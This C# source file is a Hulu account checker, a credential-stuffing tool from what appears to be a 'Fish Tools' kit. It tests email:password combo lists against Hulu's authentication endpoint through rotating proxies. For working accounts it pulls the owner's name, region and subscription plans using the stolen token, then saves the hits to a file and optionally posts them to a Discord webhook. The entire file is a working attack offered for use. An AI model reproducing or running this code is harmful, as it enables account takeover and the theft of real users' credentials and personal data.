using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Net.Http;
using System.Net;
using System.Security.Authentication;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class HuluAccountChecker
    {
        private const int CooldownTime = 350;
        public static List<string> Proxys = new List<string>();
        public static Random Rand = new Random();
        private static readonly string HitsFile = "Result/HuluHits.txt";
        private static bool UsingDiscord;
        private static string DiscordWebHook;

        public static void Main(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();

            File.WriteAllText(HitsFile, string.Empty);

            logger.Info("Enter the path to your combos file:");
            Console.Write("-> ");
            string combosPath = Console.ReadLine();

            if (!File.Exists(combosPath))
            {
                logger.Error($"No combos detected at the specified path: {combosPath}.");
                return;
            }

            logger.Info("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
            Console.Write("-> ");
            string discord = Console.ReadLine();
            UsingDiscord = !string.IsNullOrWhiteSpace(discord);
            DiscordWebHook = discord;

            logger.Info("Proxys Path:");
            Console.Write("-> ");
            string proxys = Console.ReadLine();
            Proxys.AddRange(File.ReadAllLines(proxys));

            TestCombos(logger, combosPath).GetAwaiter().GetResult();
        }
        public static string getProxy() { return Proxys[Rand.Next(0, Proxys.Count)]; }
        private static async Task TestCombos(Logger logger, string combosPath)
        {
            string[] combos = File.ReadAllLines(combosPath);

            if (combos.Length == 0)
            {
                logger.Error("No combos detected in the specified file.");
                return;
            }

            logger.Warn($"Loaded Combos: {combos.Length}");

            if (ConfirmContinue(logger))
            {
                foreach (var combo in combos)
                {
                    var split = combo.Split(':');
                    if (split.Length == 2)
                    {
                        await CheckLogin(split[0], split[1], logger);
                    }

                    await Task.Delay(CooldownTime);
                }
            }
        }
        public static bool ConfirmContinue(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();
            return true;
        }
        private static async Task CheckLogin(string email, string password, Logger Logger)
        {
            try
            {
                using (var handler = new HttpClientHandler())
                {
                    string proxyAddress = getProxy();
                    if (!string.IsNullOrWhiteSpace(proxyAddress))
                    {
                        handler.Proxy = new WebProxy(proxyAddress);
                        handler.UseProxy = true;
                    }

                    using (var httpClient = new HttpClient(handler))
                    {
                        httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");

                        string postData = $"affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={password}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={email}";
                        var content = new StringContent(postData, Encoding.UTF8, "application/x-www-form-urlencoded");

                        var response = await httpClient.PostAsync("https://auth.hulu.com/v1/device/password/authenticate", content);
                        string responseText = await response.Content.ReadAsStringAsync();

                        if (responseText.Contains("user_token"))
                        {
                            Directory.CreateDirectory("Result");
                            Match tokenMatch = Regex.Match(responseText, "user_token\":\"(.*?)\"");
                            httpClient.DefaultRequestHeaders.Add("Authorization", "Bearer " + tokenMatch.Groups[1].Value);

                            var userDetailsResponse = await httpClient.GetStringAsync("https://home.hulu.com/v1/users/self");
                            if (userDetailsResponse.Contains(",\"subscription\":{\"id\":"))
                            {
                                Match nameMatch = Regex.Match(userDetailsResponse, "\"name\":\"(.*?)\"");
                                Match birthdateMatch = Regex.Match(userDetailsResponse, "birthdate\":\"(.*?)\"");
                                Match regionMatch = Regex.Match(userDetailsResponse, "region\":\"(.*?)\"");

                                string packageDetails = "";
                                if (userDetailsResponse.Contains("\"package_ids\":(.*?),\"cus"))
                                {
                                    string packageIds = Regex.Match(userDetailsResponse, "\"package_ids\":(.*?),\"cus").Groups[1].Value;
                                    if (packageIds.Contains("[\"1\",\"2\"]")) packageDetails = "Hulu";
                                    if (packageIds.Contains("\"14\"")) packageDetails += " | Hulu (No Ads)";
                                    if (packageIds.Contains("\"15\"")) packageDetails += " | SHOWTIME®";
                                    if (packageIds.Contains("\"16\"")) packageDetails += " | Live TV";
                                    if (packageIds.Contains("\"17\"")) packageDetails += " | HBO®";
                                    if (packageIds.Contains("\"18\"")) packageDetails += " | CINEMAX®";
                                    if (packageIds.Contains("\"19\"")) packageDetails += " | STARZ®";
                                    if (packageIds.Contains("\"21\"")) packageDetails += " | Entertainment Add-On";
                                    if (packageIds.Contains("\"23\"")) packageDetails += " | Español Add-On";
                                    if (packageIds.Contains("\"25\",\"26\"")) packageDetails += " | Hulu, Disney+, and ESPN+";
                                    if (packageIds.Contains("\"17\",\"27\"")) packageDetails += " | HBO Max™";
                                }

                                string hitInfo = $"{email}:{password} | Username: {nameMatch.Groups[1].Value} | Region: {regionMatch.Groups[1].Value} | Plan: Premium | Subscription: {packageDetails}";

                                if (UsingDiscord)
                                {
                                    var payload = new
                                    {
                                        content = hitInfo,
                                        embeds = (object)null,
                                        attachments = new object[] { }
                                    };

                                    var discordContent = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                                    await httpClient.PostAsync(DiscordWebHook, discordContent);
                                }

                                File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}
